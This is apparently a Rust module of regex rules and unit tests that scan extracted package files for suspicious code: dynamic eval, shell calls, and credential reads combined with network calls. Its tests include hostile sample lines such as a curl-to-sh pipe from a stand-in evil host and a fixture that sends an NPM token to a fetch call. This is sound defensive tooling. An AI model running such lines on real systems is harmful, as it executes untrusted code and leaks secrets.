//! Static text rules for extracted source files.
//!
//! A single API match is suspicious, not proof. Rules start at WARN with medium
//! confidence; only a combination (network plus credential access, or an
//! encoded payload executed) reaches HIGH. Comments are ignored.

use std::sync::OnceLock;

use regex::Regex;
use serde::Serialize;

use crate::archive::ExtractedFile;
use crate::model::{Confidence, Severity};

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct RuleFinding {
    pub rule: &'static str,
    pub title: &'static str,
    pub severity: Severity,
    pub confidence: Confidence,
    pub file: String,
    pub line: usize,
    pub evidence: String,
    pub recommendation: &'static str,
}

fn regex(pattern: &'static str) -> &'static Regex {
    static CACHE: OnceLock<
        std::sync::Mutex<std::collections::HashMap<&'static str, &'static Regex>>,
    > = OnceLock::new();
    let map = CACHE.get_or_init(|| std::sync::Mutex::new(std::collections::HashMap::new()));
    let mut map = map.lock().unwrap_or_else(|poison| poison.into_inner());
    map.entry(pattern)
        .or_insert_with(|| Box::leak(Box::new(Regex::new(pattern).expect("valid rule regex"))))
}

fn is_comment(line: &str) -> bool {
    let trimmed = line.trim_start();
    trimmed.starts_with("//")
        || trimmed.starts_with('#')
        || trimmed.starts_with('*')
        || trimmed.starts_with("/*")
        || trimmed.starts_with("--")
}

fn first_hit(text: &str, pattern: &'static str) -> Option<(usize, String)> {
    for (index, line) in text.lines().enumerate() {
        if is_comment(line) {
            continue;
        }
        if regex(pattern).is_match(line) {
            return Some((index + 1, line.trim().chars().take(160).collect()));
        }
    }
    None
}

fn any_hit(text: &str, pattern: &'static str) -> bool {
    text.lines()
        .filter(|line| !is_comment(line))
        .any(|line| regex(pattern).is_match(line))
}

struct Rule {
    id: &'static str,
    title: &'static str,
    pattern: &'static str,
    severity: Severity,
    recommendation: &'static str,
    extensions: &'static [&'static str],
}

const RULES: &[Rule] = &[
    Rule {
        id: "JS-EXEC-001",
        title: "dynamic code execution",
        pattern: r"\beval\s*\(|new\s+Function\s*\(",
        severity: Severity::Warn,
        recommendation: "Review why this package evaluates code at runtime.",
        extensions: &["js", "mjs", "cjs", "ts", "tsx", "jsx"],
    },
    Rule {
        id: "JS-CHILD-001",
        title: "spawns a child process",
        pattern: r#"require\(['"]child_process['"]\)|from ['"]child_process['"]"#,
        severity: Severity::Warn,
        recommendation: "Check which command runs and whether install-time use is expected.",
        extensions: &["js", "mjs", "cjs", "ts", "tsx", "jsx"],
    },
    Rule {
        id: "JS-OBF-001",
        title: "decodes and executes an encoded payload",
        pattern: r"eval\s*\(\s*(atob|Buffer\.from\s*\([^)]*base64)",
        severity: Severity::High,
        recommendation: "Do not install until the encoded payload is decoded and reviewed.",
        extensions: &["js", "mjs", "cjs", "ts", "tsx", "jsx"],
    },
    Rule {
        id: "PY-EXEC-001",
        title: "dynamic code execution",
        pattern: r"\b(exec|eval)\s*\(",
        severity: Severity::Warn,
        recommendation: "Review the string being executed and where it comes from.",
        extensions: &["py"],
    },
    Rule {
        id: "PY-SHELL-001",
        title: "runs a shell command",
        pattern: r"subprocess\.[A-Za-z_]+\([^)]*shell\s*=\s*True",
        severity: Severity::Warn,
        recommendation: "Check whether shell=True is required and what input reaches it.",
        extensions: &["py"],
    },
    Rule {
        id: "SH-PIPE-001",
        title: "downloads and executes a remote script",
        pattern: r"(curl|wget)[^\n|]*\|\s*(ba)?sh\b",
        severity: Severity::High,
        recommendation: "Do not install; fetch and review the script instead.",
        extensions: &["sh", "bash", "zsh"],
    },
    Rule {
        id: "RS-BUILD-001",
        title: "build script runs commands or opens a socket",
        pattern: r"Command::new\(|std::net|TcpStream",
        severity: Severity::Warn,
        recommendation: "Review build.rs: compile steps are expected, network or shell calls are not.",
        extensions: &["rs"],
    },
    Rule {
        id: "GO-EXEC-001",
        title: "runs an external command",
        pattern: r#""os/exec""#,
        severity: Severity::Warn,
        recommendation: "Check which binary is executed and why.",
        extensions: &["go"],
    },
    Rule {
        id: "PHP-EXEC-001",
        title: "dynamic execution or shell call",
        pattern: r"\b(eval|system|shell_exec|passthru|assert)\s*\(",
        severity: Severity::Warn,
        recommendation: "Review the executed string and its source.",
        extensions: &["php"],
    },
];

pub fn scan(files: &[ExtractedFile]) -> Vec<RuleFinding> {
    let mut findings = Vec::new();
    for file in files {
        let extension = std::path::Path::new(&file.path)
            .extension()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase();
        for rule in RULES {
            if !rule.extensions.contains(&extension.as_str()) {
                continue;
            }
            if rule.id == "RS-BUILD-001" && !file.path.ends_with("build.rs") {
                continue;
            }
            let Some((line, evidence)) = first_hit(&file.text, rule.pattern) else {
                continue;
            };
            findings.push(RuleFinding {
                rule: rule.id,
                title: rule.title,
                severity: rule.severity,
                confidence: Confidence::Medium,
                file: file.path.clone(),
                line,
                evidence,
                recommendation: rule.recommendation,
            });
        }

        // Corroborated combinations are the only path to HIGH for network use.
        let js = matches!(
            extension.as_str(),
            "js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx"
        );
        if js
            && any_hit(
                &file.text,
                r#"require\(['"](https?|net)['"]\)|\bfetch\s*\("#,
            )
            && any_hit(&file.text, r"process\.env")
            && let Some((line, evidence)) = first_hit(&file.text, r"process\.env")
        {
            findings.push(RuleFinding {
                rule: "JS-NET-001",
                title: "reads credentials and talks to the network",
                severity: Severity::High,
                confidence: Confidence::Medium,
                file: file.path.clone(),
                line,
                evidence,
                recommendation: "Review where the environment data is sent before installing.",
            });
        }
        if extension == "py"
            && any_hit(
                &file.text,
                r"\b(import|from)\s+requests\b|\brequests\.(get|post|put|delete|request)\s*\(|\bsocket\.socket\s*\(|urllib\.request\b|\bhttp\.client\b",
            )
            && any_hit(&file.text, r"os\.environ")
            && let Some((line, evidence)) = first_hit(&file.text, r"os\.environ")
        {
            findings.push(RuleFinding {
                rule: "PY-NET-001",
                title: "reads credentials and talks to the network",
                severity: Severity::High,
                confidence: Confidence::Medium,
                file: file.path.clone(),
                line,
                evidence,
                recommendation: "Review where the environment data is sent before installing.",
            });
        }
    }

    findings.sort_by(|left, right| {
        left.file
            .cmp(&right.file)
            .then(left.line.cmp(&right.line))
            .then(left.rule.cmp(right.rule))
    });
    findings.dedup_by(|left, right| {
        left.file == right.file && left.line == right.line && left.rule == right.rule
    });
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    fn file(path: &str, text: &str) -> ExtractedFile {
        ExtractedFile {
            path: path.to_string(),
            text: text.to_string(),
        }
    }

    #[test]
    fn javascript_execution_is_a_warning() {
        let findings = scan(&[file("lib/index.js", "eval(input)\n")]);
        assert_eq!(findings[0].rule, "JS-EXEC-001");
        assert_eq!(findings[0].severity, Severity::Warn);
        assert_eq!(findings[0].line, 1);
    }

    #[test]
    fn encoded_execution_is_high() {
        let findings = scan(&[file("lib/x.js", "eval(atob(payload))\n")]);
        let finding = findings
            .iter()
            .find(|finding| finding.rule == "JS-OBF-001")
            .expect("missing encoded-execution finding");
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn comments_do_not_fire() {
        let findings = scan(&[file("lib/x.js", "// eval(untrusted)\n")]);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn network_alone_is_not_enough_but_with_env_is_high() {
        let alone = scan(&[file("lib/x.js", "fetch('https://example.test')\n")]);
        assert!(alone.iter().all(|finding| finding.rule != "JS-NET-001"));

        let combined = scan(&[file(
            "lib/x.js",
            "const token = process.env.NPM_TOKEN;\nfetch('https://example.test', { token });\n",
        )]);
        let finding = combined
            .iter()
            .find(|finding| finding.rule == "JS-NET-001")
            .expect("missing combined finding");
        assert_eq!(finding.severity, Severity::High);
        assert_eq!(finding.line, 1);
    }

    #[test]
    fn shell_pipe_is_high_and_only_for_shell_files() {
        let script = "curl https://evil.test | sh\n";
        assert_eq!(
            scan(&[file("install.sh", script)])[0].severity,
            Severity::High
        );
        assert!(scan(&[file("install.js", script)]).is_empty());
    }

    #[test]
    fn python_rules_and_shell_false_positive() {
        let findings = scan(&[file(
            "setup.py",
            "import subprocess\nsubprocess.run(cmd, shell=True)\n",
        )]);
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule == "PY-SHELL-001")
        );

        let findings = scan(&[file("a.py", "value = evaluation_score\n")]);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn framework_code_is_not_flagged_as_credential_exfiltration() {
        // Flask reads FLASK_ENV and mentions requests in prose; neither is a
        // network call by itself.
        let findings = scan(&[file(
            "src/flask/helpers.py",
            "import os\nfrom urllib.parse import quote\nreturn quote(os.environ.get('FLASK_ENV'))\n",
        )]);
        assert!(
            findings.iter().all(|finding| finding.rule != "PY-NET-001"),
            "{findings:?}"
        );
    }

    #[test]
    fn a_redis_method_named_exec_is_not_a_shell_call() {
        let findings = scan(&[file("src/Handler.php", "$this->redis->exec();\n")]);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn rust_build_rule_only_applies_to_build_rs() {
        assert!(scan(&[file("src/lib.rs", "Command::new(\"cc\");\n")]).is_empty());
        assert_eq!(
            scan(&[file("build.rs", "Command::new(\"cc\");\n")])[0].rule,
            "RS-BUILD-001"
        );
    }

    #[test]
    fn findings_are_sorted_and_deduplicated() {
        let findings = scan(&[file("x.js", "eval(a)\nfetch(u, { t: process.env.T })\n")]);
        let ordered: Vec<_> = findings
            .iter()
            .map(|finding| (finding.file.as_str(), finding.line, finding.rule))
            .collect();
        let mut sorted = ordered.clone();
        sorted.sort();
        assert_eq!(ordered, sorted);
    }
}
